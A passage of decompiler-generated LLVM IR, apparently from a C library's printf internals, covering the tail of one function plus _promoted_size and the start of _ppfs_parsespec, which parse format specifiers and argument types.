  store i32 %v3_13e8020, i32* %r3.global-to-local, align 4
  %v5_13e8822 = icmp slt i32 %v0_13da4, %v3_13e8020
  br i1 %v5_13e8822, label %dec_label_pc_13dac, label %dec_label_pc_13e8c.loopexit

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13da0, %dec_label_pc_13e80.backedge
  %v0_13e8024 = phi i32 [ %v0_13e80, %dec_label_pc_13e80.backedge ], [ %v0_13e8017, %dec_label_pc_13da0 ]
  %v0_13db823 = phi i32 [ %v0_13db8.be, %dec_label_pc_13e80.backedge ], [ %v0_13da4, %dec_label_pc_13da0 ]
  %v4_13dac = mul i32 %v0_13db823, 4
  %v5_13dac = add i32 %v4_13dac, %v0_13e8024
  store i32 %v5_13dac, i32* %r3.global-to-local, align 4
  %v1_13db0 = add i32 %v5_13dac, 40
  %v2_13db0 = inttoptr i32 %v1_13db0 to i32*
  %v3_13db0 = load i32, i32* %v2_13db0, align 4
  store i32 %v3_13db0, i32* %r3.global-to-local, align 4
  %v7_13db4 = icmp eq i32 %v3_13db0, 8
  %v1_13db8 = add i32 %v0_13db823, 1
  store i32 %v1_13db8, i32* %lr.global-to-local, align 4
  br i1 %v7_13db4, label %dec_label_pc_13e80.backedge, label %dec_label_pc_13dc0

dec_label_pc_13dc0:                               ; preds = %dec_label_pc_13dac
  %v1_13dc0 = add i32 %v0_13e8024, 76
  %v2_13dc0 = inttoptr i32 %v1_13dc0 to i32*
  %v3_13dc0 = load i32, i32* %v2_13dc0, align 4
  store i32 %v3_13dc0, i32* %r1.global-to-local, align 4
  %v8_13dc4 = icmp sgt i32 %v3_13db0, 8
  br i1 %v8_13dc4, label %dec_label_pc_13de8, label %dec_label_pc_13dc8

dec_label_pc_13dc8:                               ; preds = %dec_label_pc_13dc0
  %v7_13dc8 = icmp eq i32 %v3_13db0, 2
  br i1 %v7_13dc8, label %dec_label_pc_13e38, label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dc8
  %v8_13dd0 = icmp sgt i32 %v3_13db0, 2
  br i1 %v8_13dd0, label %dec_label_pc_13de0, label %dec_label_pc_13dd4

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13dd0
  %v1_13dd4 = icmp slt i32 %v3_13db0, 0
  br i1 %v1_13dd4, label %dec_label_pc_13e6c, label %dec_label_pc_13e38

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd0
  %v7_13de0 = icmp eq i32 %v3_13db0, 7
  br i1 %v7_13de0, label %dec_label_pc_13e4c, label %dec_label_pc_13e6c

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13dc0
  %v7_13de8 = icmp eq i32 %v3_13db0, 1024
  br i1 %v7_13de8, label %dec_label_pc_13e38, label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13de8
  %v8_13df0 = icmp sgt i32 %v3_13db0, 1024
  br i1 %v8_13df0, label %dec_label_pc_13e08, label %dec_label_pc_13df4

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13df0
  switch i32 %v3_13db0, label %dec_label_pc_13e6c [
    i32 256, label %dec_label_pc_13e38
    i32 512, label %dec_label_pc_13e38
  ]

dec_label_pc_13e08:                               ; preds = %dec_label_pc_13df0
  %v7_13e08 = icmp eq i32 %v3_13db0, 2048
  br i1 %v7_13e08, label %dec_label_pc_13e1c, label %dec_label_pc_13e14

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e08
  %v1_13e10 = load i32, i32* %r4.global-to-local, align 4
  %v9_13e10 = icmp eq i32 %v3_13db0, %v1_13e10
  br i1 %v9_13e10, label %dec_label_pc_13e4c, label %dec_label_pc_13e6c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e08
  %v1_13e1c = add i32 %v3_13dc0, 7
  %v1_13e20 = and i32 %v1_13e1c, -8
  store i32 %v1_13e20, i32* %r3.global-to-local, align 4
  %v1_13e24 = inttoptr i32 %v1_13e20 to i32*
  %v2_13e24 = load i32, i32* %v1_13e24, align 8
  store i32 %v2_13e24, i32* %r1.global-to-local, align 4
  %v3_13e24 = or i32 %v1_13e20, 4
  %v4_13e24 = inttoptr i32 %v3_13e24 to i32*
  %v5_13e24 = load i32, i32* %v4_13e24, align 4
  store i32 %v5_13e24, i32* %r2.global-to-local, align 4
  %v1_13e28 = add i32 %v1_13e20, 8
  store i32 %v1_13e28, i32* %r3.global-to-local, align 4
  store i32 %v1_13e28, i32* %v2_13dc0, align 4
  %v0_13e30 = load i32, i32* %ip.global-to-local, align 4
  %v1_13e30 = inttoptr i32 %v0_13e30 to i32*
  %v2_13e30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e30, i32* %v1_13e30, align 4
  %v3_13e30 = add i32 %v0_13e30, 4
  %v4_13e30 = inttoptr i32 %v3_13e30 to i32*
  %v5_13e30 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_13e30, i32* %v4_13e30, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13df4, %dec_label_pc_13df4, %dec_label_pc_13dd4, %dec_label_pc_13de8, %dec_label_pc_13dc8
  %v1_13e38 = inttoptr i32 %v3_13dc0 to i32*
  %v2_13e38 = load i32, i32* %v1_13e38, align 4
  store i32 %v2_13e38, i32* %r2.global-to-local, align 4
  %v1_13e3c = add i32 %v3_13dc0, 4
  store i32 %v1_13e3c, i32* %r3.global-to-local, align 4
  store i32 %v1_13e3c, i32* %v2_13dc0, align 4
  %v0_13e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e44 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e44 = inttoptr i32 %v1_13e44 to i32*
  store i32 %v0_13e44, i32* %v2_13e44, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13de0, %dec_label_pc_13e14
  %v3_13e4c = load i32, i32* %v2_13dc0, align 4
  %v1_13e50 = add i32 %v3_13e4c, 7
  %v1_13e54 = and i32 %v1_13e50, -8
  store i32 %v1_13e54, i32* %r3.global-to-local, align 4
  %v1_13e58 = inttoptr i32 %v1_13e54 to i32*
  %v2_13e58 = load i32, i32* %v1_13e58, align 8
  store i32 %v2_13e58, i32* %r1.global-to-local, align 4
  %v3_13e58 = or i32 %v1_13e54, 4
  %v4_13e58 = inttoptr i32 %v3_13e58 to i32*
  %v5_13e58 = load i32, i32* %v4_13e58, align 4
  store i32 %v5_13e58, i32* %r2.global-to-local, align 4
  %v1_13e5c = add i32 %v1_13e54, 8
  store i32 %v1_13e5c, i32* %r3.global-to-local, align 4
  store i32 %v1_13e5c, i32* %v2_13dc0, align 4
  %v0_13e64 = load i32, i32* %ip.global-to-local, align 4
  %v1_13e64 = inttoptr i32 %v0_13e64 to i32*
  %v2_13e64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e64, i32* %v1_13e64, align 4
  %v3_13e64 = add i32 %v0_13e64, 4
  %v4_13e64 = inttoptr i32 %v3_13e64 to i32*
  %v5_13e64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_13e64, i32* %v4_13e64, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13df4, %dec_label_pc_13de0, %dec_label_pc_13dd4, %dec_label_pc_13e14
  %v1_13e6c = add i32 %v3_13dc0, 4
  store i32 %v1_13e6c, i32* %r3.global-to-local, align 4
  store i32 %v1_13e6c, i32* %v2_13dc0, align 4
  %v0_13e74 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e74 = inttoptr i32 %v0_13e74 to i32*
  %v2_13e74 = load i32, i32* %v1_13e74, align 4
  store i32 %v2_13e74, i32* %r3.global-to-local, align 4
  %v1_13e78 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e78 = inttoptr i32 %v1_13e78 to i32*
  store i32 %v2_13e74, i32* %v2_13e78, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e4c, %dec_label_pc_13e38, %dec_label_pc_13e1c, %dec_label_pc_13e6c
  %v0_13e7c = load i32, i32* %ip.global-to-local, align 4
  %v1_13e7c = add i32 %v0_13e7c, 8
  store i32 %v1_13e7c, i32* %ip.global-to-local, align 4
  %v0_13e84.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13e80.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13e80.backedge

dec_label_pc_13e80.backedge:                      ; preds = %dec_label_pc_13e7c, %dec_label_pc_13dac
  %v0_13e80 = phi i32 [ %v0_13e80.pre, %dec_label_pc_13e7c ], [ %v0_13e8024, %dec_label_pc_13dac ]
  %v0_13db8.be = phi i32 [ %v0_13e84.pre.pre, %dec_label_pc_13e7c ], [ %v1_13db8, %dec_label_pc_13dac ]
  %v1_13e80 = add i32 %v0_13e80, 28
  %v2_13e80 = inttoptr i32 %v1_13e80 to i32*
  %v3_13e80 = load i32, i32* %v2_13e80, align 4
  store i32 %v3_13e80, i32* %r3.global-to-local, align 4
  %v5_13e88 = icmp slt i32 %v0_13db8.be, %v3_13e80
  br i1 %v5_13e88, label %dec_label_pc_13dac, label %dec_label_pc_13e80.dec_label_pc_13e8c.loopexit_crit_edge

dec_label_pc_13e90:                               ; preds = %entry
  br i1 %v6_13d58, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13e90
  %v2_13e94 = add i32 %v0_13d44, 36
  %v3_13e94 = inttoptr i32 %v2_13e94 to i8*
  %v4_13e94 = load i8, i8* %v3_13e94, align 1
  %v5_13e94 = zext i8 %v4_13e94 to i32
  %v5_13e98 = mul nuw nsw i32 %v5_13e94, 8
  %v6_13e98 = add i32 %v5_13e98, %v0_13d44
  store i32 %v6_13e98, i32* %r3.global-to-local, align 4
  %v2_13e9c = add i32 %v6_13e98, 72
  %v3_13e9c = inttoptr i32 %v2_13e9c to i32*
  %v4_13e9c = load i32, i32* %v3_13e9c, align 4
  store i32 %v4_13e9c, i32* %r3.global-to-local, align 4
  store i32 %v4_13e9c, i32* %v2_13d50, align 4
  %v0_13ea4.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13e90, %bb
  %v2_13eb8 = phi i32 [ %v0_13ea4.pre, %bb ], [ %v0_13d44, %dec_label_pc_13e90 ]
  %v1_13ea4 = add i32 %v2_13eb8, 4
  %v2_13ea4 = inttoptr i32 %v1_13ea4 to i32*
  %v3_13ea4 = load i32, i32* %v2_13ea4, align 4
  store i32 %v3_13ea4, i32* %r3.global-to-local, align 4
  %v6_13ea8 = icmp eq i32 %v3_13ea4, -2147483648
  br i1 %v6_13ea8, label %bb16, label %dec_label_pc_13e8c

bb16:                                             ; preds = %.thread1
  %v2_13eac = add i32 %v2_13eb8, 37
  %v3_13eac = inttoptr i32 %v2_13eac to i8*
  %v4_13eac = load i8, i8* %v3_13eac, align 1
  %v5_13eac = zext i8 %v4_13eac to i32
  %v5_13eb0 = mul nuw nsw i32 %v5_13eac, 8
  %v6_13eb0 = add i32 %v5_13eb0, %v2_13eb8
  store i32 %v6_13eb0, i32* %r3.global-to-local, align 4
  %v2_13eb4 = add i32 %v6_13eb0, 72
  %v3_13eb4 = inttoptr i32 %v2_13eb4 to i32*
  %v4_13eb4 = load i32, i32* %v3_13eb4, align 4
  store i32 %v4_13eb4, i32* %r3.global-to-local, align 4
  store i32 %v4_13eb4, i32* %v2_13ea4, align 4
  %v0_13ebc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13e8c

dec_label_pc_13e80.dec_label_pc_13e8c.loopexit_crit_edge: ; preds = %dec_label_pc_13e80.backedge
  br label %dec_label_pc_13e8c.loopexit

dec_label_pc_13e8c.loopexit:                      ; preds = %dec_label_pc_13e80.dec_label_pc_13e8c.loopexit_crit_edge, %dec_label_pc_13da0
  %v0_13e80.lcssa = phi i32 [ %v0_13e80, %dec_label_pc_13e80.dec_label_pc_13e8c.loopexit_crit_edge ], [ %v0_13e8017, %dec_label_pc_13da0 ]
  br label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e8c.loopexit, %.thread1, %bb16
  %v1_13edc = phi i32 [ %v0_13e80.lcssa, %dec_label_pc_13e8c.loopexit ], [ %v2_13eb8, %.thread1 ], [ %v0_13ebc.pre, %bb16 ]
  %v1_13ebc = add i32 %v1_13edc, 8
  %v2_13ebc = inttoptr i32 %v1_13ebc to i32*
  %v3_13ebc = load i32, i32* %v2_13ebc, align 4
  store i32 %v3_13ebc, i32* %r1.global-to-local, align 4
  %v1_13ec0 = icmp slt i32 %v3_13ebc, 0
  br i1 %v1_13ec0, label %dec_label_pc_13ec8, label %dec_label_pc_13ee8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13e8c
  %v1_13ec8 = add i32 %v1_13edc, 16
  %v2_13ec8 = inttoptr i32 %v1_13ec8 to i32*
  %v3_13ec8 = load i32, i32* %v2_13ec8, align 4
  %v1_13ed0 = sub i32 0, %v3_13ebc
  store i32 %v1_13ed0, i32* %r1.global-to-local, align 4
  %v1_13ecc = and i32 %v3_13ec8, -10
  %v1_13ed4 = or i32 %v1_13ecc, 8
  store i32 %v1_13ed4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13edc = add i32 %v1_13edc, 20
  %v3_13edc = inttoptr i32 %v2_13edc to i32*
  store i32 32, i32* %v3_13edc, align 4
  %v0_13ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ee0 = load i32, i32* @r0, align 4
  %v2_13ee0 = add i32 %v1_13ee0, 8
  %v3_13ee0 = inttoptr i32 %v2_13ee0 to i32*
  store i32 %v0_13ee0, i32* %v3_13ee0, align 4
  %v0_13ee4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ee4 = load i32, i32* @r0, align 4
  %v2_13ee4 = add i32 %v1_13ee4, 16
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v0_13ee4, i32* %v3_13ee4, align 4
  %v1_13eec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13ee8

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13e8c, %dec_label_pc_13ec8
  %v1_13eec = phi i32 [ %v1_13edc, %dec_label_pc_13e8c ], [ %v1_13eec.pre, %dec_label_pc_13ec8 ]
  %v2_13ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ee8, i32* @r4, align 4
  ret i32 %v1_13eec

; uselistorder directives
  uselistorder i32 %v2_13eb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13db8.be, { 1, 0 }
  uselistorder i32 %v0_13e80, { 1, 2, 0 }
  uselistorder i32 %v3_13dc0, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13dc0, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13db0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_13db823, { 1, 0 }
  uselistorder i32 %v0_13e8024, { 0, 2, 1 }
  uselistorder i32 %v0_13e8017, { 2, 0, 1 }
  uselistorder i32 %v0_13d44, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_13ee8, { 1, 0 }
  uselistorder label %dec_label_pc_13e8c, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13e7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13e6c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13e4c, { 1, 0 }
  uselistorder label %dec_label_pc_13e38, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13dac, { 1, 0 }
  uselistorder label %dec_label_pc_13da0, { 1, 0 }
  uselistorder label %dec_label_pc_13d78, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_13f10.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13f0c

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13f18, %entry
  %v0_13f0c = phi i32 [ %v1_13f0c, %dec_label_pc_13f18 ], [ add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36954), %entry ]
  %v1_13f0c = add i32 %v0_13f0c, -2
  %v2_13f0c = inttoptr i32 %v1_13f0c to i16*
  %v3_13f0c = load i16, i16* %v2_13f0c, align 2
  %v4_13f0c = sext i16 %v3_13f0c to i32
  store i32 %v1_13f0c, i32* @ip, align 4
  %v9_13f10 = icmp eq i32 %v4_13f0c, %v1_13f10.pre
  br i1 %v9_13f10, label %dec_label_pc_13f0c.dec_label_pc_13f20_crit_edge, label %dec_label_pc_13f18

dec_label_pc_13f0c.dec_label_pc_13f20_crit_edge:  ; preds = %dec_label_pc_13f0c
  br label %dec_label_pc_13f20

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13f0c
  %tmp = icmp ugt i32 %v1_13f0c, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36978)
  br i1 %tmp, label %dec_label_pc_13f0c, label %dec_label_pc_13f20.loopexit

dec_label_pc_13f20.loopexit:                      ; preds = %dec_label_pc_13f18
  br label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f20.loopexit, %dec_label_pc_13f0c.dec_label_pc_13f20_crit_edge
  %v2_13f30.pre-phi = sub i32 %v1_13f0c, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36978)
  store i32 %v2_13f30.pre-phi, i32* @r2, align 4
  %v4_13f34 = sdiv i32 %v2_13f30.pre-phi, 2
  %v5_13f34 = add i32 %v4_13f34, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36954)
  %v6_13f34 = inttoptr i32 %v5_13f34 to i8*
  %v7_13f34 = load i8, i8* %v6_13f34, align 1
  %v9_13f34 = zext i8 %v7_13f34 to i32
  ret i32 %v9_13f34

; uselistorder directives
  uselistorder i32 %v2_13f30.pre-phi, { 1, 0 }
  uselistorder i32 %v1_13f0c, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36978), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13f48 = load i32, i32* @r4, align 4
  store i32 %v3_13f48, i32* %stack_var_-36, align 4
  %v6_13f48 = load i32, i32* @r5, align 4
  %v27_13f48 = load i32, i32* @lr, align 4
  %v0_13f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_13f4c = add i32 %v0_13f4c, 16
  %v2_13f4c = inttoptr i32 %v1_13f4c to i32*
  %v3_13f4c = load i32, i32* %v2_13f4c, align 4
  %v1_13f54 = and i32 %v3_13f4c, 128
  store i32 %v1_13f54, i32* @r4, align 4
  %v2_13f54 = icmp eq i32 %v1_13f54, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_13f4c, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @lr, align 4
  %v1_13f7c = add i32 %v0_13f4c, 24
  %v2_13f7c = inttoptr i32 %v1_13f7c to i32*
  %v3_13f7c = load i32, i32* %v2_13f7c, align 4
  store i32 %v3_13f7c, i32* %fp.global-to-local, align 4
  br i1 %v2_13f54, label %.dec_label_pc_13fd0_crit_edge, label %dec_label_pc_13f88

.dec_label_pc_13fd0_crit_edge:                    ; preds = %entry
  %v2_13f80 = inttoptr i32 %v0_13f4c to i32*
  %v3_13f80 = load i32, i32* %v2_13f80, align 4
  store i32 %v3_13f80, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_13fd0

dec_label_pc_13f88:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13f98 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13fbc.dec_label_pc_13f8c_crit_edge, %dec_label_pc_13f88
  %v1_13f9c = phi i32 [ %v1_13fac, %dec_label_pc_13fbc.dec_label_pc_13f8c_crit_edge ], [ 0, %dec_label_pc_13f88 ]
  %v0_13f8c = phi i32 [ %v0_13f8c.pre, %dec_label_pc_13fbc.dec_label_pc_13f8c_crit_edge ], [ %v0_13f4c, %dec_label_pc_13f88 ]
  %v1_13f8c = inttoptr i32 %v0_13f8c to i32*
  %v2_13f8c = load i32, i32* %v1_13f8c, align 4
  %v4_13f90 = mul i32 %v1_13f9c, 4
  %v5_13f90 = add i32 %v2_13f8c, %v4_13f90
  store i32 %v5_13f90, i32* %r3.global-to-local, align 4
  %v1_13f94 = add i32 %v5_13f90, -4
  %v2_13f94 = inttoptr i32 %v1_13f94 to i8*
  %v3_13f94 = load i8, i8* %v2_13f94, align 1
  %v4_13f94 = zext i8 %v3_13f94 to i32
  store i32 %v4_13f94, i32* %r1.global-to-local, align 4
  store i32 %v2_13f98, i32* @ip, align 4
  %v2_13f9c = add i32 %v1_13f9c, %v2_13f98
  store i32 %v2_13f9c, i32* %r2.global-to-local, align 4
  %v3_13fa0 = add i32 %v2_13f9c, -72
  %v4_13fa0 = inttoptr i32 %v3_13fa0 to i8*
  store i8 %v3_13f94, i8* %v4_13fa0, align 1
  %v0_13fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13fa4 = add i32 %v0_13fa4, -4
  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  %v3_13fa4 = load i32, i32* %v2_13fa4, align 4
  store i32 %v3_13fa4, i32* %r3.global-to-local, align 4
  %v0_13fa8 = load i32, i32* %r1.global-to-local, align 4
  %v9_13fa8 = icmp eq i32 %v0_13fa8, %v3_13fa4
  %v0_13fac = load i32, i32* %r0.global-to-local, align 4
  %v1_13fac = add i32 %v0_13fac, 1
  store i32 %v1_13fac, i32* %r0.global-to-local, align 4
  br i1 %v9_13fa8, label %dec_label_pc_13fb4, label %dec_label_pc_14478

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13f8c
  %v2_13fb4 = icmp eq i32 %v3_13fa4, 0
  br i1 %v2_13fb4, label %dec_label_pc_13fc4, label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13fb4
  %tmp182 = icmp ult i32 %v1_13fac, 32
  br i1 %tmp182, label %dec_label_pc_13fbc.dec_label_pc_13f8c_crit_edge, label %dec_label_pc_13fc4

dec_label_pc_13fbc.dec_label_pc_13f8c_crit_edge:  ; preds = %dec_label_pc_13fbc
  %v0_13f8c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13f8c

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fbc, %dec_label_pc_13fb4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13fcc = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_13fcc, i32* %r0.global-to-local, align 4
  %v0_13fdc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13fd0

dec_label_pc_13fd0:                               ; preds = %.dec_label_pc_13fd0_crit_edge, %dec_label_pc_13fc4
  %v3_14004.pre-phi = phi i32 [ %.pre, %.dec_label_pc_13fd0_crit_edge ], [ %v2_13f98, %dec_label_pc_13fc4 ]
  %v0_13ffc64 = phi i32 [ %v3_13f80, %.dec_label_pc_13fd0_crit_edge ], [ %v2_13fcc, %dec_label_pc_13fc4 ]
  %v0_13fdc = phi i32 [ ptrtoint (i32* @global_var_2947c.811 to i32), %.dec_label_pc_13fd0_crit_edge ], [ %v0_13fdc.pre, %dec_label_pc_13fc4 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 684, i32* %r2.global-to-local, align 4
  %v2_13fdc = add i32 %v0_13fdc, -36916
  store i32 %v2_13fdc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_13ff0 = inttoptr i32 %v2_13fdc to i8*
  store i8* %v4_13ff0, i8** %stack_var_-120, align 4
  br label %dec_label_pc_13ffc

dec_label_pc_13ff8:                               ; preds = %.thread20, %dec_label_pc_1412c
  %v0_13ff8 = phi i32 [ %v2_141a4, %.thread20 ], [ %v0_1410876, %dec_label_pc_1412c ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_1412c ]
  store i32 %v0_13ff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ffc

dec_label_pc_13ffc:                               ; preds = %dec_label_pc_13fd0, %dec_label_pc_13ff8
  %v1_14010 = phi i32 [ %v0_13ffc64, %dec_label_pc_13fd0 ], [ %v0_13ff8, %dec_label_pc_13ff8 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_13fd0 ], [ %stack_var_-44.0, %dec_label_pc_13ff8 ]
  %v1_13ffc = inttoptr i32 %v1_14010 to i8*
  %v2_13ffc = load i8, i8* %v1_13ffc, align 1
  %v3_13ffc = zext i8 %v2_13ffc to i32
  store i32 %v3_13ffc, i32* %r3.global-to-local, align 4
  %v7_14000 = icmp eq i8 %v2_13ffc, 42
  br i1 %v7_14000, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13ffc
  store i32 %v1_14010, i32* %r6.global-to-local, align 4
  %v0_14014 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14014, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1405c.preheader

bb:                                               ; preds = %dec_label_pc_13ffc
  %v1_14008 = load i32, i32* %r8.global-to-local, align 4
  %v2_14008 = load i32, i32* %sb.global-to-local, align 4
  %v4_14008 = mul i32 %v2_14008, %v1_14008
  %v5_14008 = add i32 %v4_14008, %v3_14004.pre-phi
  store i32 %v5_14008, i32* %r3.global-to-local, align 4
  %v2_14010 = add i32 %v1_14010, 1
  store i32 %v2_14010, i32* %r6.global-to-local, align 4
  %v0_14014111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14014111, i32* %r1.global-to-local, align 4
  %v3_14018 = add i32 %v5_14008, -40
  %v4_14018 = inttoptr i32 %v3_14018 to i32*
  store i32 %v0_14014111, i32* %v4_14018, align 4
  %v0_14060.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1405c.preheader

dec_label_pc_1405c.preheader:                     ; preds = %.thread8, %bb
  %v0_14060.pre = phi i32 [ %v1_14010, %.thread8 ], [ %v0_14060.pre.pre, %bb ]
  %v0_14064.pre = load i32, i32* @lr, align 4
  %v2_14064 = add i32 %v0_14064.pre, 684
  %v3_14064 = inttoptr i32 %v2_14064 to i32*
  br label %dec_label_pc_1405c

dec_label_pc_14020:                               ; preds = %dec_label_pc_1405c
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_14024 = load i32, i32* %r1.global-to-local, align 4
  %v2_14024 = add i32 %v0_14024, -214748363
  %tmp139 = sub i32 214748362, %v0_14024
  %v6_14024 = and i32 %tmp139, %v0_14024
  %v7_14024 = icmp slt i32 %v6_14024, 0
  %v8_14024 = icmp slt i32 %v2_14024, 0
  %v9_14024 = icmp eq i32 %v0_14024, 214748363
  %v3_14028 = xor i1 %v8_14024, %v7_14024
  %v4_14028 = or i1 %v9_14024, %v3_14028
  br i1 %v4_14028, label %dec_label_pc_14040, label %dec_label_pc_1402c

dec_label_pc_1402c:                               ; preds = %dec_label_pc_14020
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_14030 = icmp eq i32 %v0_14024, 214748364
  br i1 %v9_14030, label %dec_label_pc_14038, label %dec_label_pc_14058

dec_label_pc_14038:                               ; preds = %dec_label_pc_1402c
  %v8_1403c = icmp ugt i8 %v2_14060, 55
  br i1 %v8_1403c, label %dec_label_pc_14058, label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_14038, %dec_label_pc_14020
  %v2_14044 = mul i32 %v0_14024, 10
  %v1_14048 = add i32 %v2_14044, -48
  store i32 %v1_14048, i32* %r3.global-to-local, align 4
  %v2_1404c = add i32 %v1_14048, %v3_14060
  br label %dec_label_pc_14058

dec_label_pc_14058:                               ; preds = %dec_label_pc_14038, %dec_label_pc_1402c, %dec_label_pc_14040
  %storemerge = phi i32 [ %v2_1404c, %dec_label_pc_14040 ], [ 2147483647, %dec_label_pc_1402c ], [ 2147483647, %dec_label_pc_14038 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14058 = add i32 %v0_140e0, 1
